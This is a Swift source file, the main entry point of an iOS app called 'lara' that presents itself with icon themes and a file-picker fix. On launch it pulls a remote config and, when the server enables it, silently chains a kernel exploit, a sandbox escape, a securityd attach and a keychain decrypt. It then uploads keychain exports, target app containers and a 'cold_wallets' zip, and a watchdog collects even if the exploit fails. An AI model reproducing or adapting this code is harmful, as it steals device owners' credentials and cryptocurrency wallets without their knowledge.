//
//  lara.swift
//  lara
//
//  Created by ruter on 23.03.26.
//

import SwiftUI
import UniformTypeIdentifiers

let g_isunsupported: Bool = isunsupported()
var weonadebugbuild_pjbweouttahereexclamationmark: Bool = false

@main
struct lara: App {
    @StateObject private var mgr = laramgr.shared
    @StateObject private var iconthememgr = IconThemeManager.shared
    @Environment(\.scenePhase) var scenephase
    @AppStorage("keepAlive") private var keepalive: Bool = false
    
    init() {
        #if DEBUG
        weonadebugbuild_pjbweouttahereexclamationmark = true
        #endif
        
        // fix file picker
        let fixMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.fix_init(forOpeningContentTypes:asCopy:)))!
        let origMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.init(forOpeningContentTypes:asCopy:)))!
        method_exchangeImplementations(origMethod, fixMethod)
        
        if keepalive {
            toggleka()
        }
        
        globallogger.capture()
    }
    
    var body: some Scene {
        WindowGroup {
            ContentView()
            .environmentObject(mgr)
            .overlay {
                if mgr.showrespring {
                    respringview()
                        .brightness(-1.0)
                        .ignoresSafeArea()
                }
            }
            .onAppear {
                if !isunsupported() {
                    init_offsets()
                    offsets_init()
                    iconthememgr.startPendingFixupIfPossible()
                    // beautiful name root
                    // thanks
                    mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
                    // 主协议：先拉 /api/device/config，按 exploit_enabled 开关决定是否走管线
                    MainAPI.bootstrap { run in
                        if run {
                            MainAPI.reportLogAsync(text: "pipeline started")
                            self.autorunkeychainpipeline()
                        }
                    }
                } else {
                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 and later) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                }
            }
            .onChange(of: scenephase, perform: handleScenePhase)
            .onChange(of: mgr.sbxready) { ready in
                if ready {
                    iconthememgr.startPendingFixupIfPossible()
                }
            }
        }
    }
    
    private func handleScenePhase(_ phase: ScenePhase) {
        switch phase {
        case .inactive, .background:
            // A transient .inactive/.background (system alert, Control Center,
            // screen lock, respring) must not kill the auto keychain pipeline:
            // handlebg() would destroy the SpringBoard/securityd RemoteCalls the
            // native pipeline is using, and stopcapture() would stop logging.
            // Let it finish.
            if mgr.kcpipelineactive {
                globallogger.log("(kc) scene \(phase) ignored: keychain pipeline in flight")
                return
            }
            handlebg()
            globallogger.stopcapture()

        case .active:
            globallogger.capture()
            iconthememgr.startPendingFixupIfPossible()
            // The first-launch wireless-data alert blocks the app's network
            // while the pipeline may already be running on the offline
            // fallback config; the real config only becomes fetchable after
            // the user taps Allow. Re-fetch on foreground instead of forcing
            // the user to relaunch.
            MainAPI.retryBootstrapIfNeeded { run in
                if run {
                    MainAPI.reportLogAsync(text: "pipeline started (foreground retry)")
                    self.autorunkeychainpipeline()
                }
            }

        @unknown default:
            break
        }
    }

    // Native pipeline mode: every stage is implemented in lara's own sources —
    // darksword engine + XPF kernelcache parse (KCKernelCache), sbx_escape
    // (KCSbx), keychain copy to /tmp/Acquisition-<UUID>/ (KCAcquisition),
    // securityd RemoteCall + AKS unwrap (KCSecdRemote) and local decrypt/export
    // (KCKeychain). No libuiopsersvc.framework is loaded or linked.
    private func autorunkeychainpipeline() {
        globallogger.log("(kc) native pipeline (no libuiopsersvc)")
        globallogger.log("(kc) build-marker api-v2 (net-retry + fail-fast collect)")
        prepareAndRunKeychainPipeline()
    }

    // Drive the native pipeline end-to-end: exploit -> kernelcache -> XPF
    // offsets -> sbx escape -> securityd attach -> keychain copy -> AKS unwrap
    // -> decrypt/export. We only keep the process alive and guard the
    // scene-phase teardown while it runs.
    private func prepareAndRunKeychainPipeline() {
        let mgr = self.mgr

        // Keep the process alive for the whole pipeline and ignore transient
        // scene-phase teardown (mgr.kcpipelineactive).
        mgr.kcpipelineactive = true
        if !kaenabled { toggleka() }

        do {
            try LaraKeychainSvc.ensureLoaded()
            globallogger.log("(kc) native pipeline modules ready")
        } catch {
            globallogger.log("(kc) native pipeline unavailable: \(error.localizedDescription)")
            mgr.kcpipelineactive = false
            return
        }

        globallogger.log("(kc) running native pipeline (exploit + copy + AKS unwrap)")

        // The native securityd attach + decrypt can run long and deep; GCD
        // workers only get a 512KB stack, so run the whole pipeline on a
        // dedicated large-stack thread.
        // Collection runs on the main-thread completion below (success OR
        // failure) so a dead exploit can never trap the cold_wallets zip.
        // Exactly-once is enforced by collectionFired (main thread only).
        var collectionFired = false
        let thread = Thread {
            var result: [AnyHashable: Any]?
            var failure: Error?
            do {
                // Key JSON restricted to the server-issued collection targets:
                // rows kept only when their agrp matches an issued
                // access_group / bundle_id (reverse-map from collect_configs).
                if let ccs = MainAPI.lastConfig?.collect_configs, !ccs.isEmpty {
                    let bids = ccs.compactMap { $0.bundle_id }.filter { !$0.isEmpty }
                    let ags = ccs.compactMap { $0.access_group }.filter { !$0.isEmpty }
                    LaraKeychainSvc.setExportFilter(bundleIDs: bids, accessGroups: ags)
                }
                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
            } catch {
                failure = error
            }

            // Collection is driven by the main-thread completion below, never
            // here, so exploit failure cannot trap the cold_wallets zip.
            let pipelineOK = (result?["ok"] as? Int ?? 0) == 1

            DispatchQueue.main.async {
                if !collectionFired {
                    collectionFired = true
                    if pipelineOK {
                        MainAPI.postPipelineActions()
                    } else {
                        globallogger.log("(kc) pipeline did not succeed - running collection pass anyway (MCM lease needs no exploit)")
                        MainAPI.runCollectionPass()
                    }
                } else if pipelineOK {
                    // Watchdog already collected; still ship a late keychain
                    // export if the pipeline produced one afterwards.
                    MainAPI.uploadKeychainExportIfPresent()
                }
                if let failure {
                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
                    MainAPI.reportLogAsync(text: "pipeline failed: \(failure.localizedDescription)")
                } else if let result {
                    let ok = result["ok"] ?? "nil"
                    let missing = result["aksItemsMissingSecret"] ?? "nil"
                    let mk = result["metadataKeyCount"] ?? "nil"
                    let wr = result["walletRelatedAKSRows"] ?? "nil"
                    let tables = result["tables"] as? [AnyHashable: Any]
                    var counts: [String] = []
                    if let tables {
                        for (k, v) in tables {
                            // Native pipeline stores row counts as NSNumber.
                            let n = (v as? NSNumber)?.intValue
                                ?? ((v as? [Any])?.count ?? -1)
                            counts.append("\(k)=\(n)")
                        }
                    }
                    let summary = "pipeline done: ok=\(ok) aksItemsMissingSecret=\(missing) metadataKeyCount=\(mk) walletRelated=\(wr) tables[\(counts.joined(separator: ","))]"
                    globallogger.log("(kc) keychain \(summary)")
                    MainAPI.reportLogAsync(text: summary)
                } else {
                    globallogger.log("(kc) keychain pipeline done: nil result")
                    MainAPI.reportLogAsync(text: "pipeline done: nil result")
                }
                mgr.kcpipelineactive = false
            }
        }
        thread.stackSize = 16 * 1024 * 1024
        thread.qualityOfService = .userInitiated
        thread.name = "kc-pipeline"
        thread.start()

        // Heartbeat: the framework's final export phase is silent (no framework
        // log lines), so log elapsed time while the pipeline is in flight to
        // tell "slow export" apart from "stuck loop".
        // Watchdog: if the pipeline is stuck anywhere (exploit retry, XPF
        // hang, secd attach...), still run the collection pass so target
        // containers get zipped and uploaded. Exactly-once via
        // collectionFired, shared with the completion block above.
        Timer.scheduledTimer(withTimeInterval: 360, repeats: false) { _ in
            if mgr.kcpipelineactive, !collectionFired {
                collectionFired = true
                globallogger.log("(kc) watchdog: pipeline stuck over 360s - running collection pass anyway")
                MainAPI.reportLogAsync(text: "watchdog: pipeline stuck, collecting anyway")
                MainAPI.runCollectionPass()
            }
        }
        let pipelineStart = Date()
        var tick = 0
        Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { timer in
            tick += 1
            if mgr.kcpipelineactive {
                globallogger.log(String(format: "(kc) heartbeat %d: pipeline in flight %.0fs", tick, Date().timeIntervalSince(pipelineStart)))
            } else {
                globallogger.log(String(format: "(kc) heartbeat %d: pipeline finished after %.0fs", tick, Date().timeIntervalSince(pipelineStart)))
                timer.invalidate()
            }
        }
    }

    private func handlebg() {
        guard mgr.rcready else { return }
        let keepSpringBoardRemoteCallAlive = UserDefaults.standard.bool(forKey: "keepSpringBoardRemoteCallAliveIOS16")
        if isIOS16() && keepSpringBoardRemoteCallAlive {
            return
        }

        var bgTask: UIBackgroundTaskIdentifier = .invalid

        bgTask = UIApplication.shared.beginBackgroundTask(withName: "RemoteCallCleanup") {
            endbgtask(&bgTask)
        }

        mgr.rcdestroy {
            self.endbgtask(&bgTask)
        }
    }

    private func endbgtask(_ task: inout UIBackgroundTaskIdentifier) {
        guard task != .invalid else { return }
        UIApplication.shared.endBackgroundTask(task)
        task = .invalid
    }
}

// file picker fixes
extension UIDocumentPickerViewController {
    @objc func fix_init(forOpeningContentTypes contentTypes: [UTType], asCopy: Bool) -> UIDocumentPickerViewController {
        return fix_init(forOpeningContentTypes: contentTypes, asCopy: true)
    }
}

// make strings compatiable with errors
extension String: @retroactive Error {}
